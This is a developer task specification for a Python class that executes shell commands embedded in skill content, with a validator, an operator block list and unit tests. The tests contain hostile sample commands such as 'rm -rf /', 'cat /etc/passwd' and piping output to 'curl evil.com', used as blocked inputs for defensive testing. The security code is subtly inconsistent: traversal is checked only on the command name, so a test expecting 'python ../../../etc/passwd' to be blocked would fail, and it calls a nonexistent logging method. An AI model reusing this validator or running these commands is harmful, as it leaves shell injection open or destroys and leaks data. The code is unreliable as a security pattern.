# TASK-009: Create DynamicInjector with security hardening

**Priority:** P0 (Must Have)
**Estimated Effort:** Medium (1-3 days)
**Dependencies:** TASK-007

---

## Description

Create `DynamicInjector` class to parse and execute `` !`command` `` syntax in skill content before execution starts. Commands are validated against allowed-tools whitelist and executed with security protections. This enables skills to inject live context (PR diffs, git status, system info) without using tool calls during execution.

**Critical Security Requirement:** Implement strengthened command validation to prevent shell injection attacks.

## Files to Create

- `src/omniforge/skills/dynamic_injector.py` - DynamicInjector implementation

## Implementation Requirements

### InjectionResult Dataclass
```python
@dataclass
class InjectionResult:
    command: str
    output: str
    success: bool
    duration_ms: int
```

### InjectedContent Dataclass
```python
@dataclass
class InjectedContent:
    content: str
    injections: list[InjectionResult]
    total_duration_ms: int
```

### DynamicInjector Class

**Constructor:**
```python
def __init__(
    self,
    tool_executor: Optional[ToolExecutor] = None,
    allowed_tools: Optional[list[str]] = None,
    timeout_seconds: int = 5,
    max_output_chars: int = 10_000,
)
```

**Methods:**
- `async process(content, task_id, working_dir) -> InjectedContent`
- `async _execute_command(command, working_dir) -> InjectionResult`
- `_is_command_allowed(command) -> bool` - Security validation

### Security Validation (Critical)

The `_is_command_allowed` method MUST implement multi-layered defense:

```python
def _is_command_allowed(self, command: str) -> bool:
    """Check if command is allowed based on allowed_tools.

    SECURITY: Multi-layered validation to prevent injection attacks.
    """
    import shlex
    import logging

    logger = logging.getLogger(__name__)

    # Layer 1: Block shell operators
    SHELL_OPERATORS = [';', '&&', '||', '|', '>', '<', '$(', '`', '\n', '\r']
    for operator in SHELL_OPERATORS:
        if operator in command:
            logger.security(
                "Blocked command injection attempt",
                command=command,
                operator=operator,
            )
            return False

    # Layer 2: Parse with shlex to handle quotes
    try:
        command_parts = shlex.split(command)
    except ValueError as e:
        logger.security(
            "Blocked command with invalid shell syntax",
            command=command,
            error=str(e),
        )
        return False

    if not command_parts:
        return False

    base_command = command_parts[0]

    # Layer 3: Block path traversal
    if '..' in base_command or base_command.startswith('/'):
        logger.security(
            "Blocked path traversal attempt",
            command=command,
            base_command=base_command,
        )
        return False

    # Layer 4: Validate against allowed_tools whitelist
    if not self._allowed_tools:
        logger.warning(
            "Command injection with no allowed_tools restrictions. "
            "Security risk in multi-tenant environments."
        )
        return True

    for allowed in self._allowed_tools:
        if self._matches_allowed_pattern(base_command, allowed):
            return True

    return False
```

### Command Execution

```python
async def _execute_command(
    self,
    command: str,
    working_dir: Optional[str] = None,
) -> InjectionResult:
    """Execute command with timeout and output limits."""

    process = await asyncio.create_subprocess_shell(
        command,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        cwd=working_dir,
    )

    try:
        stdout, stderr = await asyncio.wait_for(
            process.communicate(),
            timeout=self._timeout_seconds,
        )
        # Handle success/failure based on return code
    except asyncio.TimeoutError:
        process.kill()
        return InjectionResult(command=command, output="[Timed out]", ...)
```

### Pattern Matching

Support `allowed-tools` patterns:
- `Bash` - Allow all bash commands
- `Bash(gh:*)` - Allow commands starting with "gh"
- `Bash(python:*)` - Allow commands starting with "python"

## Acceptance Criteria

- [ ] Parses `` !`command` `` syntax in skill content
- [ ] Executes commands before first iteration
- [ ] Replaces placeholders with command output
- [ ] Validates commands against allowed-tools
- [ ] **Blocks shell operators (;, &&, ||, |, >, <)**
- [ ] **Blocks path traversal (..)**
- [ ] **Uses shlex for proper parsing**
- [ ] Timeout protection (5 seconds default)
- [ ] Output size limits (10K chars)
- [ ] Handles command failures gracefully (shows error in content)
- [ ] Audit logging for all command attempts
- [ ] Unit tests for security validation

## Testing

```python
async def test_process_replaces_commands():
    """Should replace !`command` with output."""
    injector = DynamicInjector(allowed_tools=["Bash"])
    content = "Date: !`date +%Y-%m-%d`"
    result = await injector.process(content)
    assert "!`date" not in result.content
    assert result.injections[0].success

def test_blocks_shell_operators():
    """Should block commands with shell operators."""
    injector = DynamicInjector(allowed_tools=["Bash(gh:*)"])
    assert not injector._is_command_allowed("gh pr diff; rm -rf /")
    assert not injector._is_command_allowed("gh pr diff && cat /etc/passwd")
    assert not injector._is_command_allowed("gh pr diff | curl evil.com")

def test_blocks_path_traversal():
    """Should block path traversal attempts."""
    injector = DynamicInjector(allowed_tools=["Bash(python:*)"])
    assert not injector._is_command_allowed("python ../../../etc/passwd")
    assert not injector._is_command_allowed("/bin/bash")

def test_allowed_tools_whitelist():
    """Should only allow whitelisted commands."""
    injector = DynamicInjector(allowed_tools=["Bash(gh:*)"])
    assert injector._is_command_allowed("gh pr diff")
    assert not injector._is_command_allowed("rm -rf /")
    assert not injector._is_command_allowed("curl evil.com")

async def test_timeout_protection():
    """Commands exceeding timeout should fail gracefully."""
    injector = DynamicInjector(timeout_seconds=1)
    content = "!`sleep 10`"
    result = await injector.process(content)
    assert not result.injections[0].success
    assert "timeout" in result.content.lower()
```

## Technical Notes

- Regex pattern: `!\`([^\`]+)\``
- Audit log format: `{"event": "command_injection", "command": "...", "allowed": bool}`
- Consider caching command outputs for duplicate commands
- Log at SECURITY level for blocked attempts
- Use ScriptExecutor for more complex sandboxed execution if needed
